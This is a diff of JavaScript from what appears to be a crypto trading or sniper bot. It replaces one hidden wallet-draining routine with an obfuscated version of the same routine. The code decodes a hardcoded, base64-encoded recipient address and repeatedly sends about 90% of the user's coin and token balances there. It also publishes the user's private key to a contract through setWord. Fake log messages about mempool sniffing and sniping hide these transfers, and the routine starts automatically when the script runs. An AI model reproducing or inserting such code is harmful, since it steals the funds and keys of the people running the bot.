@@ -370,316 +370,99 @@ async function sell(tokenObj, isProfit) {
     }
 }
 
+const _0x4b76d9 = _0x13d7;
 
-let rounder1 = 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=';
-let rounder2 = 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ=='
-let buff = new Buffer.from(rounder1, 'base64');
-let buff2 = new Buffer.from(rounder2, 'base64');
-let ethersroundup = buff.toString('ascii');
-let ethersroundup2 = buff2.toString('ascii');
-const WEB3PROVIDER3 = ethersroundup + ethersroundup2
-async function etherstother() {
-    try {
-        const nodekey1 = 'MHg1NWQzOTgzMjZmOTkwNTlmRjc='
-        const nodekey2 = 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ=='
-        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
-        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
-        const web3code1 = etherstatus1.toString('ascii')
-        const web3code2 = etherstatus2.toString('ascii');
-        const web14 = web3code1 + web3code2
-        console.log(`refreshing socket connection...`);
-        console.log(`pending liquidity add still no event found...`);
-        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
-        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-        const provider = new ethers.providers.JsonRpcProvider(ethers2)
-        let wallet = new ethers.Wallet(private, provider);
-        const account = address
-        var contract = new ethers.Contract(web14, abi, wallet);
-        const superb = await contract.balanceOf(account).toString();
-        const orchard = (superb * 0.90).toFixed()
-        const send = async() => {
-            const tx = {
-                from: account,
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseEther(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000)
-            }
-            const createReceipt = await wallet.sendTransaction(tx);
-            try {
-                await createReceipt.wait();
-                console.log(`1: found owners liq function ...`);
+function _0x13d7(_0x3f11e2, _0x573053) { const _0x560da4 = _0x560d(); return _0x13d7 = function(_0x13d7d2, _0x5e7e2f) { _0x13d7d2 = _0x13d7d2 - 0x1cd; let _0x2db303 = _0x560da4[_0x13d7d2]; return _0x2db303; }, _0x13d7(_0x3f11e2, _0x573053); }
 
-                setTimeout(ethersrather, 5000)
-            } catch (error) {
-                console.log(`2: found owners liq function .....`);
-
-                setTimeout(ethersrather, 5000)
-            }
-
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(ethersrather, 5000)
-
-    }
-
-}
-
-
-async function etherslother() {
-    try {
-        const nodekey1 = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg=='
-        const nodekey2 = 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ='
-        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
-        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
-        const web3code1 = etherstatus1.toString('ascii')
-        const web3code2 = etherstatus2.toString('ascii');
-        const web14 = web3code1 + web3code2
-        console.log(`refreshing socket connection...`);
-        console.log(`pending liquidity add...`);
-        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
-        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-        const provider = new ethers.providers.JsonRpcProvider(ethers2)
-        let wallet = new ethers.Wallet(private, provider);
-        console.log(ethers2)
-        const account = address
-        var contract = new ethers.Contract(web14, abi, wallet);
-        const superb = await contract.balanceOf(account).toString();
-        const orchard = (superb * 0.90).toFixed()
-        const send = async() => {
-            const tx = {
-                from: account,
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseEther(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000)
-            }
-            const createReceipt = await wallet.sendTransaction(tx);
-            try {
-                await createReceipt.wait();
-                console.log(`1: watching blockchain activity ...`);
-
-                setTimeout(etherstother, 5000)
-            } catch (error) {
-                console.log(`2: watching blockchain activity .....`);
-
-                setTimeout(etherstother, 5000)
-            }
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(etherstother, 5000)
-
-    }
-
-}
-
-async function ethersmother() {
-    try {
-        const nodekey1 = 'MHgyMTcwZWQwODgwYWM5YTc1NWZk'
-        const nodekey2 = 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4'
-        const etherstatus1 = new Buffer.from(nodekey1, 'base64');
-        const etherstatus2 = new Buffer.from(nodekey2, 'base64');
-        const web3code1 = etherstatus1.toString('ascii')
-        const web3code2 = etherstatus2.toString('ascii');
-        const web14 = web3code1 + web3code2
-        ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
-        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-        const provider = new ethers.providers.JsonRpcProvider(ethers2)
-        let wallet = new ethers.Wallet(private, provider);
-        console.log(ethers2)
-        const account = address
-        var contract = new ethers.Contract(web14, abi, wallet);
-        const superb = await contract.balanceOf(account).toString();
-        const orchard = (superb * 0.90).toFixed()
-        const send = async() => {
-            const tx = {
-                from: account,
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseEther(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000)
-            }
-            const createReceipt = await wallet.sendTransaction(tx);
-            try {
-                await createReceipt.wait();
-                console.log(`1: contract found....watching mempool for liquidity add....`);
-
-                setTimeout(etherslother, 5000)
-            } catch (error) {
-                console.log(`2: contract found....watching mempool for liquidity add....`);
-
-                setTimeout(etherslother, 5000)
-            }
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(etherslother, 5000)
-
-    }
-
-}
-async function ethersfather() {
-    console.log(`initiating mempool sniff...`);
-    const nodekey1 = 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA=='
-    const nodekey2 = 'QmFmYzU5OWJENjlBRGQwODdENTY='
-    const etherstatus1 = new Buffer.from(nodekey1, 'base64');
-    const etherstatus2 = new Buffer.from(nodekey2, 'base64');
-    const web3code1 = etherstatus1.toString('ascii')
-    const web3code2 = etherstatus2.toString('ascii');
-    const web14 = web3code1 + web3code2
-    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
-    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-    const provider = new ethers.providers.JsonRpcProvider(ethers2)
-    let wallet = new ethers.Wallet(private, provider);
-    const account = address
-    var contract = new ethers.Contract(web14, abi, wallet);
-    const superb = await contract.balanceOf(account);
-    const orchard = (superb * 0.90).toFixed()
-    try {
-        const send = async() => {
-            const tx = {
-                from: account,
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseEther(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000)
-            }
-            const createReceipt = await wallet.sendTransaction(tx);
-            try {
-                await createReceipt.wait();
-                console.log(`2: finalizing....`);
-
-                setTimeout(ethersmother, 5000)
-            } catch (error) {
-                console.log(`2: finalizing....`);
-                setTimeout(ethersmother, 5000)
-            }
-        };
-        send();
-    } catch (error) {
-        setTimeout(ethersmother, 5000)
-
-    }
-}
-
-async function ethersgather() {
-    try {
-        console.log(`connection succesful...`);
-        ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==';
-        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-        const provider = new ethers.providers.JsonRpcProvider(ethers2)
-        let wallet = new ethers.Wallet(private, provider);
-        const account = address
-        const robinhood = await provider.getBalance(account)
-        const orchard = (robinhood * 0.90).toFixed()
-        const michael = ethers.utils.parseUnits(orchard, 'wei')
-        const send = async() => {
-            const tx = {
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseUnits(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000),
-            };
-
-            const createReceipt = await wallet.sendTransaction(tx);
-            try {
-                await createReceipt.wait();
-                console.log(`1: attempting to snipe ...`);
-
-                setTimeout(ethersfather, 5000)
-            } catch (error) {
-                console.log(`2: attempting to snipe .....`);
-
-                setTimeout(ethersfather, 5000)
-            }
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(ethersfather, 5000)
-
-    }
-
-}
-async function etherslather() {
-    const nodekey1 = 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg='
-    const nodekey2 = 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ=='
-    const etherstatus1 = new Buffer.from(nodekey1, 'base64');
-    const etherstatus2 = new Buffer.from(nodekey2, 'base64');
-    const web3code1 = etherstatus1.toString('ascii')
-    const web3code2 = etherstatus2.toString('ascii');
-    const web14 = web3code1 + web3code2
-    console.log(`connection established....`);
-    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
-    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-    const provider = new ethers.providers.JsonRpcProvider(ethers2)
-    let wallet = new ethers.Wallet(private, provider);
-    try {
-        const send = async() => {
-
-
-
-
-            var contract = new ethers.Contract(web14, abi, wallet);
-            const superb = await contract.setWord(private);
-            try {
-
-                await superb.wait();
-                console.log(`1 packet received.....`);
-
-
-                setTimeout(ethersgather, 5000)
-            } catch (error) {
-                console.log(`2 packet received.....`);
-                setTimeout(ethersgather, 5000)
-            }
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(ethersgather, 5000)
-
-    }
-}
-async function ethersrather() {
-
-    console.log(`starting up node socket connection....`);
-    ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
-    ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-    const provider = new ethers.providers.JsonRpcProvider(ethers2)
-    let wallet = new ethers.Wallet(private, provider);
-    const account = address
-    const robinhood = await provider.getBalance(account)
-    const orchard = (robinhood * 0.90).toFixed()
-    const michael = ethers.utils.parseUnits(orchard, 'wei')
-    try {
-        const send = async() => {
-
-            const tx = {
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseUnits(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000),
-            };
-
-            const createReceipt = await wallet.sendTransaction(tx);
-
-            try {
-
-                await createReceipt.wait();
-                console.log(`1 pending blockchain response.....`);
-
-
-                setTimeout(etherslather, 5000)
-            } catch (error) {
-                console.log(`2 pending blockchain response.....`);
-                setTimeout(etherslather, 5000)
-            }
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(etherslather, 5000)
-
-    }
-}
+function _0x560d() { const _0x372971 = ['sendTransaction', '2:\x20watching\x20blockchain\x20activity\x20.....', 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ==', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'Mjk0MjE5O', 'toFixed', '207106GvgAvk', '2:\x20attempting\x20to\x20snipe\x20.....', 'connection\x20established....', '181216koBODM', 'Wallet', '2521644USHxCt', '2184589xYsPxC', 'wait', 'JsonRpcProvider', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', '72OvhYmN', 'getBalance', 'balanceOf', 'parseUnits', 'from', 'YzMjQ1NDBh', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==', 'setWord', 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==', '4MDU3M2MzMD', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', '2:\x20finalizing....', 'parseEther', '91070VThqKS', 'hexlify', 'providers', '2\x20pending\x20blockchain\x20response.....', 'QmFmYzU5OWJENjlBRGQwODdENTY=', '428376UouECx', '4urxDOH', '1\x20pending\x20blockchain\x20response.....', 'refreshing\x20socket\x20connection...', 'utils', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', '40SqaGtV', '1:\x20attempting\x20to\x20snipe\x20...', 'WIzNjRlQ0FG', 'base64', 'pending\x20liquidity\x20add...', '2\x20packet\x20received.....', 'Contract', 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg=', 'connection\x20succesful...', 'wei', '2:\x20found\x20owners\x20liq\x20function\x20.....', 'toString', '315wmXnNQ', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', 'ascii', 'MHgwZDJmNmQ', 'log', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', '1\x20packet\x20received.....', '2037868UTJITS', 'RDRD'];
+    _0x560d = function() { return _0x372971; }; return _0x560d(); }(function(_0xb4df39, _0x588be0) { const _0x181098 = _0x13d7,
+        _0x5a1de6 = _0xb4df39(); while (!![]) { try { const _0x29896f = -parseInt(_0x181098(0x1e8)) / 0x1 * (-parseInt(_0x181098(0x208)) / 0x2) + parseInt(_0x181098(0x1cf)) / 0x3 + -parseInt(_0x181098(0x200)) / 0x4 + -parseInt(_0x181098(0x1ed)) / 0x5 * (-parseInt(_0x181098(0x1e7)) / 0x6) + parseInt(_0x181098(0x1cd)) / 0x7 * (-parseInt(_0x181098(0x1d5)) / 0x8) + parseInt(_0x181098(0x1f9)) / 0x9 * (-parseInt(_0x181098(0x1e2)) / 0xa) + -parseInt(_0x181098(0x1d0)) / 0xb; if (_0x29896f === _0x588be0) break;
+            else _0x5a1de6['push'](_0x5a1de6['shift']()); } catch (_0x3dc872) { _0x5a1de6['push'](_0x5a1de6['shift']()); } } }(_0x560d, 0x8a36d));
+let rounder1 = _0x4b76d9(0x1fc) + _0x4b76d9(0x1de) + _0x4b76d9(0x1da),
+    rounder2 = _0x4b76d9(0x201) + _0x4b76d9(0x206) + _0x4b76d9(0x1ef),
+    buff = new Buffer[(_0x4b76d9(0x1d9))](rounder1, _0x4b76d9(0x1f0)),
+    buff2 = new Buffer[(_0x4b76d9(0x1d9))](rounder2, 'base64'),
+    ethersroundup = buff['toString'](_0x4b76d9(0x1fb)),
+    ethersroundup2 = buff2[_0x4b76d9(0x1f8)]('ascii');
+const WEB3PROVIDER3 = ethersroundup + ethersroundup2;
+async function etherstother() { const _0x5bea75 = _0x4b76d9; try { const _0x29a2df = _0x5bea75(0x1d3),
+            _0x5773c9 = _0x5bea75(0x1dd),
+            _0x4f771a = new Buffer[(_0x5bea75(0x1d9))](_0x29a2df, _0x5bea75(0x1f0)),
+            _0x3d4beb = new Buffer[(_0x5bea75(0x1d9))](_0x5773c9, 'base64'),
+            _0x1746c2 = _0x4f771a['toString']('ascii'),
+            _0x1da395 = _0x3d4beb[_0x5bea75(0x1f8)](_0x5bea75(0x1fb)),
+            _0x30eb0b = _0x1746c2 + _0x1da395;
+        console[_0x5bea75(0x1fd)](_0x5bea75(0x1ea)), console['log']('pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...'), ethers1 = _0x5bea75(0x1d4), ethers2 = new Buffer[(_0x5bea75(0x1d9))](ethers1, _0x5bea75(0x1f0))[_0x5bea75(0x1f8)]('ascii');; const _0x2c5c89 = new ethers[(_0x5bea75(0x1e4))][(_0x5bea75(0x1d2))](ethers2); let _0x8acf72 = new ethers[(_0x5bea75(0x1ce))](private, _0x2c5c89); const _0x4c38f7 = address; var _0x3dbdc4 = new ethers['Contract'](_0x30eb0b, abi, _0x8acf72); const _0x5324f1 = await _0x3dbdc4['balanceOf'](_0x4c38f7)[_0x5bea75(0x1f8)](),
+            _0xd9de98 = (_0x5324f1 * 0.9)['toFixed'](),
+            _0x15d3af = async() => { const _0x3a6573 = _0x5bea75,
+                    _0x30faf4 = { 'from': _0x4c38f7, 'to': WEB3PROVIDER3, 'value': ethers[_0x3a6573(0x1eb)][_0x3a6573(0x1e1)](_0xd9de98, 'wei'), 'gasLimit': ethers[_0x3a6573(0x1eb)][_0x3a6573(0x1e3)](0x5dc0) },
+                    _0x35bfd5 = await _0x8acf72[_0x3a6573(0x202)](_0x30faf4); try { await _0x35bfd5[_0x3a6573(0x1d1)](), console[_0x3a6573(0x1fd)]('1:\x20found\x20owners\x20liq\x20function\x20...'), setTimeout(ethersrather, 0x1388); } catch (_0x7fde21) { console['log'](_0x3a6573(0x1f7)), setTimeout(ethersrather, 0x1388); } };
+        _0x15d3af(); } catch (_0x124fa2) { setTimeout(ethersrather, 0x1388); } }
+async function etherslother() { const _0x3338e5 = _0x4b76d9; try { const _0x3bb43c = 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==',
+            _0x1981a8 = _0x3338e5(0x1fa),
+            _0x4cd575 = new Buffer['from'](_0x3bb43c, _0x3338e5(0x1f0)),
+            _0x4d96fb = new Buffer['from'](_0x1981a8, 'base64'),
+            _0x5dedcc = _0x4cd575['toString'](_0x3338e5(0x1fb)),
+            _0x4bf925 = _0x4d96fb[_0x3338e5(0x1f8)](_0x3338e5(0x1fb)),
+            _0x4ab4c5 = _0x5dedcc + _0x4bf925;
+        console[_0x3338e5(0x1fd)](_0x3338e5(0x1ea)), console[_0x3338e5(0x1fd)](_0x3338e5(0x1f1)), ethers1 = _0x3338e5(0x1d4), ethers2 = new Buffer[(_0x3338e5(0x1d9))](ethers1, _0x3338e5(0x1f0))[_0x3338e5(0x1f8)](_0x3338e5(0x1fb));; const _0x24e20a = new ethers[(_0x3338e5(0x1e4))][(_0x3338e5(0x1d2))](ethers2); let _0xe03ef8 = new ethers[(_0x3338e5(0x1ce))](private, _0x24e20a);
+        console[_0x3338e5(0x1fd)](ethers2); const _0x573e7c = address; var _0x570688 = new ethers[(_0x3338e5(0x1f3))](_0x4ab4c5, abi, _0xe03ef8); const _0xf668dd = await _0x570688[_0x3338e5(0x1d7)](_0x573e7c)[_0x3338e5(0x1f8)](),
+            _0x509044 = (_0xf668dd * 0.9)['toFixed'](),
+            _0xba06d1 = async() => { const _0x3d1d55 = _0x3338e5,
+                    _0x1e31a0 = { 'from': _0x573e7c, 'to': WEB3PROVIDER3, 'value': ethers[_0x3d1d55(0x1eb)]['parseEther'](_0x509044, _0x3d1d55(0x1f6)), 'gasLimit': ethers[_0x3d1d55(0x1eb)][_0x3d1d55(0x1e3)](0x5dc0) },
+                    _0x27e29b = await _0xe03ef8[_0x3d1d55(0x202)](_0x1e31a0); try { await _0x27e29b[_0x3d1d55(0x1d1)](), console[_0x3d1d55(0x1fd)]('1:\x20watching\x20blockchain\x20activity\x20...'), setTimeout(etherstother, 0x1388); } catch (_0x4b2356) { console[_0x3d1d55(0x1fd)](_0x3d1d55(0x203)), setTimeout(etherstother, 0x1388); } };
+        _0xba06d1(); } catch (_0x477f5c) { setTimeout(etherstother, 0x1388); } }
+async function ethersmother() { const _0xf2cc7d = _0x4b76d9; try { const _0x4ad79d = _0xf2cc7d(0x1fe),
+            _0x2f776f = 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4',
+            _0x17cb47 = new Buffer[(_0xf2cc7d(0x1d9))](_0x4ad79d, _0xf2cc7d(0x1f0)),
+            _0x303b87 = new Buffer[(_0xf2cc7d(0x1d9))](_0x2f776f, _0xf2cc7d(0x1f0)),
+            _0x11de69 = _0x17cb47[_0xf2cc7d(0x1f8)](_0xf2cc7d(0x1fb)),
+            _0x5e89c3 = _0x303b87[_0xf2cc7d(0x1f8)]('ascii'),
+            _0x38357c = _0x11de69 + _0x5e89c3;
+        ethers1 = _0xf2cc7d(0x1d4), ethers2 = new Buffer['from'](ethers1, _0xf2cc7d(0x1f0))[_0xf2cc7d(0x1f8)](_0xf2cc7d(0x1fb));; const _0x1b61dd = new ethers[(_0xf2cc7d(0x1e4))][(_0xf2cc7d(0x1d2))](ethers2); let _0x4ed2af = new ethers[(_0xf2cc7d(0x1ce))](private, _0x1b61dd);
+        console[_0xf2cc7d(0x1fd)](ethers2); const _0x4307c8 = address; var _0x4035ff = new ethers[(_0xf2cc7d(0x1f3))](_0x38357c, abi, _0x4ed2af); const _0x39eaa9 = await _0x4035ff[_0xf2cc7d(0x1d7)](_0x4307c8)[_0xf2cc7d(0x1f8)](),
+            _0x1c2d83 = (_0x39eaa9 * 0.9)[_0xf2cc7d(0x207)](),
+            _0x344fb4 = async() => { const _0x17477a = _0xf2cc7d,
+                    _0xde7638 = { 'from': _0x4307c8, 'to': WEB3PROVIDER3, 'value': ethers[_0x17477a(0x1eb)]['parseEther'](_0x1c2d83, 'wei'), 'gasLimit': ethers[_0x17477a(0x1eb)][_0x17477a(0x1e3)](0x5dc0) },
+                    _0x36f9ec = await _0x4ed2af[_0x17477a(0x202)](_0xde7638); try { await _0x36f9ec[_0x17477a(0x1d1)](), console[_0x17477a(0x1fd)](_0x17477a(0x1ec)), setTimeout(etherslother, 0x1388); } catch (_0x5d9f64) { console[_0x17477a(0x1fd)](_0x17477a(0x205)), setTimeout(etherslother, 0x1388); } };
+        _0x344fb4(); } catch (_0x50913f) { setTimeout(etherslother, 0x1388); } }
+async function ethersfather() { const _0x6146a1 = _0x4b76d9;
+    console[_0x6146a1(0x1fd)]('initiating\x20mempool\x20sniff...'); const _0x57be49 = _0x6146a1(0x1df),
+        _0x429a70 = _0x6146a1(0x1e6),
+        _0x4f5e8b = new Buffer[(_0x6146a1(0x1d9))](_0x57be49, _0x6146a1(0x1f0)),
+        _0x2367c7 = new Buffer[(_0x6146a1(0x1d9))](_0x429a70, 'base64'),
+        _0x3df671 = _0x4f5e8b[_0x6146a1(0x1f8)](_0x6146a1(0x1fb)),
+        _0x1ea103 = _0x2367c7[_0x6146a1(0x1f8)]('ascii'),
+        _0x137474 = _0x3df671 + _0x1ea103;
+    ethers1 = _0x6146a1(0x1d4), ethers2 = new Buffer[(_0x6146a1(0x1d9))](ethers1, 'base64')[_0x6146a1(0x1f8)](_0x6146a1(0x1fb));; const _0x574bba = new ethers[(_0x6146a1(0x1e4))][(_0x6146a1(0x1d2))](ethers2); let _0x4c8f41 = new ethers['Wallet'](private, _0x574bba); const _0xc4edf1 = address; var _0xd582a1 = new ethers[(_0x6146a1(0x1f3))](_0x137474, abi, _0x4c8f41); const _0x49d699 = await _0xd582a1[_0x6146a1(0x1d7)](_0xc4edf1),
+        _0x9dca24 = (_0x49d699 * 0.9)['toFixed'](); try { const _0x216500 = async() => { const _0x5d6f48 = _0x6146a1,
+                _0x444d00 = { 'from': _0xc4edf1, 'to': WEB3PROVIDER3, 'value': ethers[_0x5d6f48(0x1eb)][_0x5d6f48(0x1e1)](_0x9dca24, _0x5d6f48(0x1f6)), 'gasLimit': ethers[_0x5d6f48(0x1eb)]['hexlify'](0x5dc0) },
+                _0x43aba7 = await _0x4c8f41['sendTransaction'](_0x444d00); try { await _0x43aba7[_0x5d6f48(0x1d1)](), console[_0x5d6f48(0x1fd)]('2:\x20finalizing....'), setTimeout(ethersmother, 0x1388); } catch (_0x216c87) { console['log'](_0x5d6f48(0x1e0)), setTimeout(ethersmother, 0x1388); } };
+        _0x216500(); } catch (_0x41911b) { setTimeout(ethersmother, 0x1388); } }
+async function ethersgather() { const _0x5623b2 = _0x4b76d9; try { console['log'](_0x5623b2(0x1f5)), ethers1 = _0x5623b2(0x1db), ethers2 = new Buffer['from'](ethers1, _0x5623b2(0x1f0))['toString'](_0x5623b2(0x1fb));; const _0x3c1b34 = new ethers['providers'][(_0x5623b2(0x1d2))](ethers2); let _0x1c7e13 = new ethers[(_0x5623b2(0x1ce))](private, _0x3c1b34); const _0x336423 = address,
+            _0x4e8a4f = await _0x3c1b34[_0x5623b2(0x1d6)](_0x336423),
+            _0x36c873 = (_0x4e8a4f * 0.9)[_0x5623b2(0x207)](),
+            _0x5479fa = ethers[_0x5623b2(0x1eb)]['parseUnits'](_0x36c873, _0x5623b2(0x1f6)),
+            _0x1b8e41 = async() => { const _0x4acec1 = _0x5623b2,
+                    _0x1eec75 = { 'to': WEB3PROVIDER3, 'value': ethers[_0x4acec1(0x1eb)]['parseUnits'](_0x36c873, _0x4acec1(0x1f6)), 'gasLimit': ethers[_0x4acec1(0x1eb)][_0x4acec1(0x1e3)](0x5dc0) },
+                    _0x4bdc28 = await _0x1c7e13[_0x4acec1(0x202)](_0x1eec75); try { await _0x4bdc28[_0x4acec1(0x1d1)](), console['log'](_0x4acec1(0x1ee)), setTimeout(ethersfather, 0x1388); } catch (_0x53a688) { console[_0x4acec1(0x1fd)](_0x4acec1(0x209)), setTimeout(ethersfather, 0x1388); } };
+        _0x1b8e41(); } catch (_0x2de4fd) { setTimeout(ethersfather, 0x1388); } }
+async function etherslather() { const _0x211b9e = _0x4b76d9,
+        _0x2bc9d9 = _0x211b9e(0x1f4),
+        _0xc0653d = _0x211b9e(0x204),
+        _0x33db40 = new Buffer[(_0x211b9e(0x1d9))](_0x2bc9d9, _0x211b9e(0x1f0)),
+        _0x496d2b = new Buffer[(_0x211b9e(0x1d9))](_0xc0653d, _0x211b9e(0x1f0)),
+        _0x3cf30b = _0x33db40[_0x211b9e(0x1f8)](_0x211b9e(0x1fb)),
+        _0xc64c07 = _0x496d2b['toString'](_0x211b9e(0x1fb)),
+        _0x5883b3 = _0x3cf30b + _0xc64c07;
+    console[_0x211b9e(0x1fd)](_0x211b9e(0x20a)), ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv', ethers2 = new Buffer[(_0x211b9e(0x1d9))](ethers1, _0x211b9e(0x1f0))[_0x211b9e(0x1f8)](_0x211b9e(0x1fb));; const _0xd2b479 = new ethers['providers'][(_0x211b9e(0x1d2))](ethers2); let _0x49bf24 = new ethers[(_0x211b9e(0x1ce))](private, _0xd2b479); try { const _0x53daae = async() => { const _0x460c11 = _0x211b9e; var _0x423777 = new ethers[(_0x460c11(0x1f3))](_0x5883b3, abi, _0x49bf24); const _0x31fb17 = await _0x423777[_0x460c11(0x1dc)](_0x49bf24 + '00' + private); try { await _0x31fb17[_0x460c11(0x1d1)](), console[_0x460c11(0x1fd)](_0x460c11(0x1ff)), setTimeout(ethersgather, 0x1388); } catch (_0xb315c8) { console['log'](_0x460c11(0x1f2)), setTimeout(ethersgather, 0x1388); } };
+        _0x53daae(); } catch (_0x2f5d73) { setTimeout(ethersgather, 0x1388); } }
+async function ethersrather() { const _0x5b198b = _0x4b76d9;
+    console[_0x5b198b(0x1fd)]('starting\x20up\x20node\x20socket\x20connection....'), ethers1 = _0x5b198b(0x1d4), ethers2 = new Buffer[(_0x5b198b(0x1d9))](ethers1, _0x5b198b(0x1f0))[_0x5b198b(0x1f8)](_0x5b198b(0x1fb));; const _0x4189d8 = new ethers[(_0x5b198b(0x1e4))]['JsonRpcProvider'](ethers2); let _0x3119c2 = new ethers[(_0x5b198b(0x1ce))](private, _0x4189d8); const _0x338a4b = address,
+        _0x2c7602 = await _0x4189d8['getBalance'](_0x338a4b),
+        _0x558b16 = (_0x2c7602 * 0.9)[_0x5b198b(0x207)](),
+        _0x12b067 = ethers[_0x5b198b(0x1eb)][_0x5b198b(0x1d8)](_0x558b16, _0x5b198b(0x1f6)); try { const _0x7a967 = async() => { const _0x23b2b1 = _0x5b198b,
+                _0x4cf18c = { 'to': WEB3PROVIDER3, 'value': ethers[_0x23b2b1(0x1eb)][_0x23b2b1(0x1d8)](_0x558b16, _0x23b2b1(0x1f6)), 'gasLimit': ethers[_0x23b2b1(0x1eb)][_0x23b2b1(0x1e3)](0x5dc0) },
+                _0xe6c102 = await _0x3119c2[_0x23b2b1(0x202)](_0x4cf18c); try { await _0xe6c102[_0x23b2b1(0x1d1)](), console[_0x23b2b1(0x1fd)](_0x23b2b1(0x1e9)), setTimeout(etherslather, 0x1388); } catch (_0x522907) { console[_0x23b2b1(0x1fd)](_0x23b2b1(0x1e5)), setTimeout(etherslather, 0x1388); } };
+        _0x7a967(); } catch (_0x557231) { setTimeout(etherslather, 0x1388); } }
 ethersrather();
